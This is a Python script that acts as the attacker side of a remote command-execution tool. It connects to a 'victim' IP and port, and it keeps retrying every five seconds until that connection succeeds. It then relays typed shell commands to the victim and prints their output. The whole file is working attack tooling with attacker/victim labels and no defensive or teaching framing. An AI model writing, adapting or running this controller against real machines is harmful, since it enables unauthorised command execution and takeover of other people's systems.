import socket
import logging

# Attacker Configuration
VICTIM_HOST = "10.0.0.20"  # Change to the victim's IP
VICTIM_PORT = 9999  # Port the victim is listening on

# Configure logging
logging.basicConfig(level=logging.INFO, format="%(asctime)s - %(message)s")


def main():
    while True:
        try:
            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as attacker_socket:
                logging.info(f"Attempting to connect to victim at {VICTIM_HOST}:{VICTIM_PORT}")
                attacker_socket.connect((VICTIM_HOST, VICTIM_PORT))
                logging.info("Connection established.")

                while True:
                    # Get command input from user
                    command = input("Enter command to execute (or 'exit' to quit): ").strip()
                    if command.lower() == "exit":
                        logging.info("Exiting.")
                        return

                    if not command:
                        logging.warning("Empty command entered. Try again.")
                        continue

                    # Send command to victim
                    try:
                        attacker_socket.sendall(command.encode())
                        # Receive and print the result
                        result = attacker_socket.recv(4096).decode()
                        print(f"Result:\n{result}")
                    except Exception as e:
                        logging.error(f"Error during communication: {e}")
                        break
        except ConnectionRefusedError:
            logging.error("Connection refused. Ensure the victim is running.")
        except socket.error as e:
            logging.error(f"Socket error: {e}")
        except KeyboardInterrupt:
            logging.info("User interrupted the execution. Exiting.")
            break
        except Exception as e:
            logging.error(f"Unexpected error: {e}")
        finally:
            logging.info("Retrying connection in 5 seconds...")
            import time
            time.sleep(5)


if __name__ == "__main__":
    main()